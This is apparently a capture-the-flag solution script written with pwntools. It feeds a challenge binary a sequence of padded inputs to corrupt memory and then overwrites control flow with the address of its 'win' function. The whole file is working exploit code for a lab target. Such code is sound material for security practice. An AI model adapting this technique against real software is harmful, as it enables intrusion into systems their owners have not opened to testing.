from pwn import *

e = context.binary = ELF("./chal")
p = e.process()
#p = remote("localhost", 13337)

def add(name):
    p.sendafter(b": ", name)
    return p.recvuntil(b"Enter", drop=True)

def exit_prog():
    p.sendafter(b": ", b"\n")

for i in range(0xa):
    add(b"A" * 0xb)

for i in range(0x5):
    add(b"A" * 0xa)
    
add(b"A" * 0x3)
add(b"A" * 0x3)


add(b"A" * 0xa)
add(b"A" * 0xb)
add(b"A" * 4 + p64(e.sym.win))

exit_prog()
print(p.recvall().decode())

